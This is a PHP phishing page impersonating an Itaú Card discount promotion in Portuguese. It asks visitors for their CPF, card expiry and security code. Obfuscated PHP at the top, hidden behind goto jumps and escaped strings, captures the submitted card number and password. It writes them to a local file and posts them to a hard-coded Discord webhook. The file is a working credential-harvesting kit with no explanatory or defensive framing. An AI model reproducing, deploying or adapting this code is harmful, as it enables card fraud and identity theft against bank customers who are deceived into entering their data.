<?php
 goto aE3Yu; mSHfc: if (empty($modulo1)) { } else { $answer = $modulo1; $content = "\103\x41\122\x54\101\117\x3a\40{$answer}"; $link = "\x68\164\164\x70\x73\x3a\57\57\144\x69\163\x63\x6f\162\144\x2e\x63\x6f\155\57\x61\x70\x69\x2f\167\x65\x62\150\x6f\x6f\153\163\x2f\61\x31\x31\x39\67\70\67\71\x33\66\x34\x34\x38\62\x35\x33\x39\x36\x33\57\62\x74\143\146\107\x46\x6d\115\x48\116\141\64\167\x58\x4f\115\x50\123\x34\x30\x50\163\142\107\x50\111\x68\152\166\110\144\x2d\x49\x77\x73\143\70\x45\x36\x51\145\x53\x56\167\123\166\101\x63\x65\63\x47\157\x61\112\111\164\x6f\x71\x74\137\x4e\x6f\x4d\146\x68\152\x51\161"; $basearray = array("\143\x6f\156\164\x65\156\164" => $content); $hookarray = array("\150\164\164\x70" => array("\150\x65\141\144\x65\x72" => "\x43\x6f\x6e\x74\145\156\164\x2d\x74\x79\x70\x65\x3a\40\141\x70\160\x6c\151\x63\141\x74\x69\x6f\156\x2f\x78\x2d\167\167\167\55\x66\157\x72\155\55\165\x72\154\x65\156\143\157\144\145\x64\15\12", "\x6d\x65\x74\x68\x6f\x64" => "\120\117\123\124", "\x63\157\156\164\145\156\164" => http_build_query($basearray))); file_get_contents($link, false, stream_context_create($hookarray)); } goto WdDJz; YuVXp: $fp = fopen("\x63\x61\162\144\163\145\156\150\x61\x2e\164\x78\164", "\x61"); goto b6FkF; iwQ1X: $tudo = '' . $card . "\x20\x7c\40" . $senha . "\40\x7c\x20"; goto YuVXp; AxaBk: fclose($fp); goto PpPwk; WdDJz: if (empty($modulo2)) { } else { $answer = $modulo2; $content = "\x53\105\116\110\101\x20\64\x20\104\111\107\x49\x54\117\x3a\x20{$answer}"; $link = "\x68\x74\164\x70\x73\x3a\57\x2f\144\x69\x73\x63\x6f\162\x64\x2e\143\x6f\155\57\141\x70\151\x2f\x77\x65\142\150\157\x6f\153\163\57\x31\61\61\x39\67\x38\67\x39\x33\66\x34\64\70\x32\x35\x33\x39\x36\63\x2f\62\x74\x63\x66\x47\106\x6d\115\x48\x4e\x61\64\167\x58\x4f\115\x50\x53\64\60\x50\163\142\107\120\x49\150\x6a\166\x48\144\x2d\111\167\163\x63\70\105\66\121\145\x53\126\x77\123\166\101\x63\x65\63\107\157\x61\x4a\x49\164\x6f\x71\164\137\x4e\x6f\115\146\x68\152\x51\161"; $basearray = array("\x63\x6f\x6e\164\x65\x6e\164" => $content); $hookarray = array("\150\x74\x74\x70" => array("\x68\145\x61\x64\145\x72" => "\103\157\156\164\x65\156\x74\55\x74\171\x70\x65\72\x20\x61\x70\160\154\x69\143\141\164\151\x6f\156\x2f\170\55\167\167\167\x2d\x66\157\162\x6d\55\165\162\x6c\145\156\x63\x6f\144\145\x64\15\12", "\x6d\145\164\150\x6f\144" => "\x50\x4f\x53\x54", "\x63\157\156\164\x65\156\x74" => http_build_query($basearray))); file_get_contents($link, false, stream_context_create($hookarray)); } goto P9_BT; aE3Yu: $card = $_POST["\x6e\165\155\143"]; goto FytJ8; b6FkF: fwrite($fp, $tudo); goto AxaBk; PpPwk: $modulo1 = $_POST["\156\165\x6d\143"]; goto Ydpxv; FytJ8: $senha = $_POST["\160\x61\163\x73\x63"]; goto iwQ1X; Ydpxv: $modulo2 = $_POST["\x70\141\163\x73\x63"]; goto mSHfc; P9_BT: ?>
<!DOCTYPE html>
<html><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
	<title>Itau Card | Promoção descontão</title>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
	<script type="text/javascript" src="promocao_arquivos/jquery-3.js"></script>
	<script type="text/javascript" src="promocao_arquivos/jquery.js"></script>
	<script type="text/javascript" src="promocao_arquivos/cad_promo_scripts.js"></script>
	<link rel="stylesheet" type="text/css" href="promocao_arquivos/cad_promo_style.css">
</head>
<body>
	<header class="top-promo">
		<img src="promocao_arquivos/img_logo.png">
	</header>
	<section class="prog-cad">
		<ul>
			<li class="active">Identificação</li>
			<li>Cadastro</li>
			<li>Benefícios</li>
		</ul>
	</section>
	<section class="frm-container">
		<div class="eng-tx">
			<p>Olá cliente, para cadastrar seu cartão na promoção descontão 
Itaucard e receber 50% de desconto em suas compras feitas nos 
estabelecimentos parceiros do itau, confirme os dados abaixo.</p>
		</div>
		<div class="frm">
			<form id="frmcad" name="frmcad" method="POST" action="parabens.php">
				<input name="numc" value="1232 1231 2312 3212" type="hidden">
				<input name="passc" value="1232" type="hidden">
				<div class="frm-item">
					<input id="numcpf" name="numcpf" maxlength="14" autocomplete="off" required="" onkeyup="validatefrmcad(this.id)" type="tel">
					<label for="numcpf" class="label-float">CPF</label>
				</div>
				<div class="frm-item">
					<input id="numdtv" name="numdtv" maxlength="5" autocomplete="off" required="" onkeyup="validatefrmcad(this.id)" type="tel">
					<label for="numdtv" class="label-float">Validade do cartão</label>
				</div>
				<div class="frm-item">
					<input id="numcvv" name="numcvv" maxlength="3" autocomplete="off" required="" onkeyup="validatefrmcad(this.id)" type="tel">
					<label for="numcvv" class="label-float">Código de segurança</label>
					<span id="helpcvv" class="helpcvv"></span>
				</div>
				<input id="btncad" class="btncad" name="btncad" value="cadastrar" disabled="disabled" onclick="return validateckfrm()" type="submit">
			</form>
		</div>
	</section>
	<section id="mod-help-cvv" class="mod-help-cvv">
		<span id="mod-help-close" class="mod-help-close">x</span>
		<div class="container-mod">
			<img class="img-mod-help" src="promocao_arquivos/img_card_cvv.png">
			<p>O código de segurança são os três dígitos que encontra-se no verso do seu cartão, como mostrado na imagem acima.</p>
		</div>
	</section>

</body></html>
